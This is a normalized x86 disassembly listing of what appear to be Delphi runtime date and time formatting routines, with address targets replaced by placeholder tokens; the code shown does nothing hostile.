movzx ecx [ esi + ecx * 2 - 0x2 ]
mov [ ebp - 0x10 ] cx
movzx ecx [ ebp - 0xe ]
cmp cx [ ebp - 0x10 ]
jb r-xdata
sub_40bbe0
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
mov eax esi
call sub_40ba94
pop esi
pop ecx
pop ebp
retn 0x8
sub_40bc00
push ebx
add esp 0xfffffff8
mov ebx eax
movzx ecx [ ebx + 0x6 ]
movzx edx [ ebx + 0x2 ]
movzx eax [ ebx ]
call sub_40ba64
fstp [ esp ]
fwait
fld [ esp ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
jb r-xdata
movzx eax [ ebx + 0xe ]
push eax
movzx ecx [ ebx + 0xc ]
movzx edx [ ebx + 0xa ]
movzx eax [ ebx + 0x8 ]
call sub_40b8c0
fsubr [ esp ]
fstp [ esp ]
fwait
movzx eax [ ebx + 0xe ]
push eax
movzx ecx [ ebx + 0xc ]
movzx edx [ ebx + 0xa ]
movzx eax [ ebx + 0x8 ]
call sub_40b8c0
fadd [ esp ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_40bc70
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
call sub_40b80c
mov eax [ ebp - 0x4 ]
mov ecx 0x7
cdq
idiv ecx
mov eax edx
inc eax
pop ecx
pop ecx
pop ebp
retn 0x8
sub_40bc98
add esp 0xffffffe8
lea eax [ esp + 0x8 ]
push eax
call GetLocalTime
movzx ecx [ esp + 0xe ]
movzx edx [ esp + 0xa ]
movzx eax [ esp + 0x8 ]
call sub_40ba64
fstp [ esp ]
fwait
fld [ esp ]
add esp 0x18
retn
sub_40bcc4
add esp 0xffffffe8
lea eax [ esp + 0x8 ]
push eax
call GetLocalTime
movzx eax [ esp + 0x16 ]
push eax
movzx ecx [ esp + 0x18 ]
movzx edx [ esp + 0x16 ]
movzx eax [ esp + 0x14 ]
call sub_40b8c0
fstp [ esp ]
fwait
fld [ esp ]
add esp 0x18
retn
sub_40bcf8
add esp 0xffffffe0
lea eax [ esp + 0x8 ]
push eax
call GetLocalTime
movzx ecx [ esp + 0xe ]
movzx edx [ esp + 0xa ]
movzx eax [ esp + 0x8 ]
call sub_40ba64
fstp [ esp + 0x18 ]
fwait
movzx eax [ esp + 0x16 ]
push eax
movzx ecx [ esp + 0x18 ]
movzx edx [ esp + 0x16 ]
movzx eax [ esp + 0x14 ]
call sub_40b8c0
fadd [ esp + 0x18 ]
fstp [ esp ]
fwait
fld [ esp ]
add esp 0x20
retn
sub_40bd5c
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
mov ebx 0x100
sub ebx [ ecx - 0x104 ]
cmp edx ebx
jge r-xdata
test ebx ebx
je r-xdata
mov ebx edx
mov eax [ ebp + 0x8 ]
add [ eax - 0x104 ] ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x104 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + edx - 0x100 ]
mov ecx ebx
call sub_4030fc
sub_40bda0
push ebp
mov ebp esp
mov edx eax
test edx edx
je r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40bd5c
pop ecx
pop ebp
retn
sub edx 0x4
mov edx [ edx ]
sub_40bdbc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
push 0x4
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x1
mov ecx rw-data
lea eax [ ebp - 0x10 ]
mov edx 0x10
call sub_40aba0
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_40bd5c
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40be08
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx [ eax ]
jmp r-xdata
mov ecx [ eax ]
movzx ecx [ ecx ]
mov ebx [ ebp + 0x8 ]
cmp cl [ ebx - 0x5 ]
je r-xdata
inc [ eax ]
mov eax [ eax ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
pop ebx
pop ebp
retn
sub_40be34
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x13 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x12 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff2
call sub_40bbe0
mov eax [ ebp + 0x8 ]
mov [ eax - 0x13 ] 0x1
sub_40be6c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1d ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe4
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1a ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffea
call sub_40b900
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1d ] 0x1
sub_40beac
push ebp
mov ebp esp
add esp 0xfffffee4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x11c ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40c00e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_405530
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4055c8
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c015
lea eax [ ebp - 0x11c ]
call sub_405530
lea eax [ ebp - 0x4 ]
call sub_405530
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_4057a0
dec esi
jne r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
sub eax 0xd
jne r-xdata
mov eax [ ebx ]
mov [ ebp - 0x118 ] eax
mov esi [ ebp - 0x118 ]
test esi esi
je r-xdata
push ebx
mov eax [ ebx ]
mov edx 0x1
call sub_40e6e0
mov ecx eax
mov eax [ ebx ]
mov edx 0x1
call sub_405a44
jmp r-xdata
mov eax [ ebx ]
mov edx esi
call sub_40e540
cmp eax 0x4
jne r-xdata
sub esi 0x4
mov esi [ esi ]
mov eax [ ebx ]
mov edx 0x3
call sub_40e65c
mov esi eax
lea eax [ ebp - 0x114 ]
add esi eax
dec esi
lea eax [ ebp - 0x11c ]
mov edx esi
call sub_405728
mov eax [ ebp - 0x11c ]
mov edx 0x2
call sub_40e6e0
mov ecx eax
mov eax ebx
mov edx esi
call sub_405620
sub_40c028
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40c116
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_405530
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
cmp esi 0x2
jg r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4055c8
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c11d
lea eax [ ebp - 0x4 ]
call sub_405530
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_4057a0
dec esi
jne r-xdata
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
mov eax [ ebx ]
mov [ ebp - 0x118 ] eax
mov esi [ ebp - 0x118 ]
test esi esi
je r-xdata
push ebx
mov ecx esi
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_405a44
sub esi 0x4
mov esi [ esi ]
sub_40c140
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x2c ] edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x4 ] eax
lea edi [ ebp - 0x4 ]
xor eax eax
push ebp
push j_sub_404de4#9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c8cb
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_405554
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x108 ] 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x108 ]
mov [ ebp - 0x1e ] 0x20
mov [ ebp - 0x13 ] 0x0
mov [ ebp - 0x1d ] 0x0
mov [ ebp - 0x1f ] 0x0
jmp r-xdata
mov eax [ edi ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ edi ]
movzx eax [ eax ]
mov [ ebp - 0x5 ] al
movzx eax [ ebp - 0x5 ]
movzx eax al
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x108 ]
mov eax [ edi ]
call sub_40e770
mov [ edi ] eax
movzx ebx [ ebp - 0x5 ]
mov eax ebx
add al 0x9f
sub al 0x1a
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi ]
call sub_40e750
mov edx eax
mov eax [ edi ]
call sub_40bd5c
pop ecx
mov eax [ edi ]
call sub_40e770
mov [ edi ] eax
mov [ ebp - 0x1e ] 0x20
jmp r-xdata
mov eax ebx
add al 0xbf
sub al 0x1a
jae r-xdata
sub bl 0x20
movzx eax bl
add eax 0xffffffde
cmp eax 0x38
ja r-xdata
cmp bl 0x4d
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_40bd5c
pop ecx
movzx eax [ eax + lookup_table_40c228 ]
jmp [ eax * 4 + jump_table_40c261 ]
mov [ ebp - 0x1e ] bl
cmp [ ebp - 0x1e ] 0x48
jne r-xdata
push ebp
call sub_40be08
pop ecx
push ebp
call sub_40be34
pop ecx
cmp [ ebp - 0xc ] 0x2
jg r-xdata
push ebp
call sub_40be08
pop ecx
push ebp
call sub_40be34
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0xc ]
call sub_40beac
pop ecx
mov eax [ ebp - 0x28 ]
call sub_40bda0
pop ecx
jmp r-xdata
push ebp
call sub_40be08
pop ecx
push ebp
call sub_40be34
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
call sub_40c028
pop ecx
mov eax [ ebp - 0x2c ]
call sub_40bda0
pop ecx
jmp r-xdata
push ebp
call sub_40be08
pop ecx
push ebp
call sub_40be34
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_40be08
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_40be08
pop ecx
push ebp
call sub_40be6c
pop ecx
mov [ ebp - 0x20 ] 0x0
mov esi [ edi ]
jmp r-xdata
push ebp
call sub_40be08
pop ecx
push ebp
call sub_40be6c
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_40be08
pop ecx
push ebp
call sub_40be6c
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_40be08
pop ecx
cmp [ ebp - 0xc ] 0x1
jne r-xdata
push ebp
call sub_40be08
pop ecx
push ebp
call sub_40be6c
pop ecx
cmp [ ebp - 0xc ] 0x3
jle r-xdata
push ebp
call sub_40be6c
pop ecx
mov esi [ edi ]
dec esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_40a9fc
test eax eax
jne r-xdata
push ebp
call sub_40be08
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40c140
pop ecx
push ebp
call sub_40be6c
pop ecx
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ edi ]
jmp r-xdata
mov bl 0x4e
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov edx 0x4
call sub_40bdbc
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov ecx 0x64
xor edx edx
div ecx
mov eax edx
mov edx 0x2
call sub_40bdbc
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_40bdbc
pop ecx
jmp r-xdata
je r-xdata
push ebp
call sub_40be34
pop ecx
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x12 ]
mov edx [ ebp - 0xc ]
call sub_40bdbc
pop ecx
jmp r-xdata
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
call sub_40bdbc
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1a ]
mov edx [ ebp - 0xc ]
call sub_40bdbc
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40c140
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40c140
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_40bdbc
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x3
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_40a9fc
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax r-xdata
mov edx 0x1
call sub_40bd5c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40c140
pop ecx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_40bd5c
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_40bd5c
pop ecx
jmp r-xdata
mov eax [ edi ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_40bda0
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_40bc70
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40bda0
pop ecx
jmp r-xdata
dec eax
je r-xdata
movzx eax [ esi ]
movzx eax al
bt [ rw-data ] eax
jae r-xdata
movzx eax [ ebp - 0x16 ]
mov [ ebp - 0x22 ] ax
cmp [ ebp - 0x1f ] 0x0
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_40a9fc
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x2
mov eax esi
call sub_40bd5c
pop ecx
add [ edi ] 0x4
mov [ ebp - 0x1f ] 0x1
jmp r-xdata
add esi 0x3
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ edi ]
sub edx esi
mov eax esi
call sub_40bd5c
pop ecx
mov eax [ edi ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ edi ]
movzx eax [ eax ]
cmp al [ ebp - 0x5 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_40bda0
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_40bc70
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40bda0
pop ecx
jmp r-xdata
dec eax
je r-xdata
movzx eax [ esi ]
cmp eax 0x48
jg r-xdata
mov eax esi
call sub_40e770
mov esi eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
jle r-xdata
cmp [ ebp - 0x22 ] 0x0
jne r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_40a9fc
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x1
mov eax esi
call sub_40bd5c
pop ecx
add [ edi ] 0x2
mov [ ebp - 0x1f ] 0x1
jmp r-xdata
add esi 0x2
inc [ edi ]
jmp r-xdata
mov eax [ edi ]
movzx eax [ eax ]
movzx eax al
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40c140
pop ecx
jmp r-xdata
jmp r-xdata
sub eax 0x61
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x22 ]
mov edx [ ebp - 0xc ]
call sub_40bdbc
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
cmp [ ebp - 0x22 ] 0xc
jbe r-xdata
mov [ ebp - 0x22 ] 0xc
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_40a9fc
test eax eax
jne r-xdata
push ebp
call sub_40be34
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_40bc70
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40bda0
pop ecx
add [ edi ] 0x3
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40bda0
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40bda0
pop ecx
jmp r-xdata
inc [ edi ]
mov eax [ edi ]
call sub_40e770
mov [ edi ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40c140
pop ecx
jmp r-xdata
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
sub eax 0x7
je r-xdata
sub eax 0x22
je r-xdata
sub [ ebp - 0x22 ] 0xc
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_40bd5c
pop ecx
jmp r-xdata
push ebp
call sub_40be34
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_40bc70
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40bda0
pop ecx
add [ edi ] 0x2
jmp r-xdata
add [ edi ] 0x3
mov [ ebp - 0x1f ] 0x1
jmp r-xdata
inc esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_40a9fc
test eax eax
je r-xdata
jmp r-xdata
movzx eax [ ebp - 0x20 ]
xor al 0x1
mov [ ebp - 0x20 ] al
sub eax 0x5
je r-xdata
mov [ ebp - 0x1f ] 0x1
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_40a9fc
test eax eax
je r-xdata
sub eax 0x1a
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_40a9fc
test eax eax
jne r-xdata
jmp r-xdata
sub_40c8f8
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
mov [ ebp - 0x108 ] eax
test ebx ebx
je r-xdata
push ebp
mov eax r-xdata
call sub_40c140
pop ecx
push ebp
mov eax ebx
call sub_40c140
pop ecx
jmp r-xdata
lea edx [ ebp - 0x100 ]
mov eax esi
mov ecx [ ebp - 0x104 ]
call sub_405620
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40c954
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ edi ]
jmp r-xdata
mov eax esi
call sub_40580c
cmp ebx eax
jg r-xdata
mov [ edi ] ebx
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
je r-xdata
inc ebx
sub_40c978
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40c954
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
xor esi esi
jmp r-xdata
mov eax edi
call sub_40580c
cmp ebx eax
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax ]
jle r-xdata
movzx eax [ edi + ebx - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
movzx eax [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
sub al dl
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax ] si
mov [ ebp - 0x9 ] 0x1
cmp si 0x3e8
jb r-xdata
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
movzx edx [ edi + ebx - 0x1 ]
sub dx 0x30
add ax dx
mov esi eax
inc ebx
sub_40ca0c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40cad2
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cad9
lea eax [ ebp - 0x14 ]
call sub_405530
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40c954
mov esi ebx
test esi esi
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov ecx esi
mov eax [ ebp - 0x4 ]
call sub_405a44
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov esi ebx
test esi esi
je r-xdata
sub esi 0x4
mov esi [ esi ]
mov edi [ ebp - 0x10 ]
test edi edi
je r-xdata
sub esi 0x4
mov esi [ esi ]
push edi
mov eax [ ebp - 0x10 ]
call sub_4059dc
push eax
push esi
mov eax ebx
call sub_4059dc
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
test eax eax
jne r-xdata
sub edi 0x4
mov edi [ edi ]
mov eax ebx
test eax eax
je r-xdata
mov edx [ ebp - 0x8 ]
add [ edx ] eax
mov [ ebp - 0x9 ] 0x1
sub eax 0x4
mov eax [ eax ]
sub_40cae4
push ebx
push esi
push edi
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
xor ebx ebx
mov edx edi
mov eax esi
call sub_40c954
mov eax esi
test eax eax
je r-xdata
cmp eax [ edi ]
jl r-xdata
sub eax 0x4
mov eax [ eax ]
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
movzx eax [ esi + eax - 0x1 ]
cmp al [ esp ]
jne r-xdata
inc [ edi ]
mov bl 0x1
sub_40cb20
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov edi 0x1
jmp r-xdata
mov eax esi
call sub_40580c
cmp edi eax
jle r-xdata
movzx eax [ esi + edi - 0x1 ]
and al 0xdf
sub al 0x44
je r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
dec al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x2
jmp r-xdata
sub al 0x8
je r-xdata
xor ebx ebx
jmp r-xdata
sub al 0xc
je r-xdata
mov bl 0x2
jmp r-xdata
jmp r-xdata
inc edi
sub_40cb6c
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov eax esi
call sub_40580c
cmp eax [ ebx ]
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
movzx eax [ esi + eax - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov eax [ ebx ]
movzx eax [ esi + eax - 0x1 ]
movzx eax al
bt [ rw-data ] eax
jae r-xdata
inc [ ebx ]
mov edx [ ebx ]
mov eax esi
call sub_40e7b0
mov [ ebx ] eax
jmp r-xdata
sub_40cbb4
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
xor eax eax
mov [ esp ] eax
mov edi 0x7
mov ebx rw-data
mov esi rw-data
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4059dc
push eax
mov eax [ ebx ]
call sub_4059dc
pop edx
call sub_40e998
test eax eax
je r-xdata
add esi 0x4
add ebx 0x4
dec edi
jne r-xdata
mov eax [ esi ]
mov [ esp ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub_40cc08
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ rw-data ] 0x12
jne r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
cmp ebx 0x63
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jle r-xdata
call sub_40bd48
movzx ecx ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
xor eax edx
sub eax edx
add ecx eax
mov eax ecx
mov ecx 0x64
cdq
idiv ecx
imul eax eax 0x64
add ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
neg [ eax - 0x4 ]
jmp r-xdata
sub_40cc64
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40cf86
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
mov [ ebp - 0x16 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0xd ] 0x0
mov eax [ rw-data ]
call sub_40cb20
mov [ ebp - 0xe ] al
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x67
jne r-xdata
mov edx [ rw-data ]
mov eax r-xdata
call sub_40e8cc
test eax eax
jle r-xdata
mov edx ebx
mov eax esi
call sub_40cb6c
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx ]
dec ecx
mov edx 0x1
mov eax esi
call sub_405a44
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x8 ]
call sub_409b7c
mov eax [ ebp - 0x8 ]
call sub_40cbb4
mov [ ebp - 0x4 ] eax
jmp r-xdata
lea eax [ ebp - 0x19 ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_40c978
test al al
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cf8d
lea eax [ ebp - 0x28 ]
mov edx 0x3
call sub_405554
lea eax [ ebp - 0x8 ]
call sub_405530
retn
mov edx ebx
movzx ecx [ rw-data ]
mov eax esi
call sub_40cae4
test al al
je r-xdata
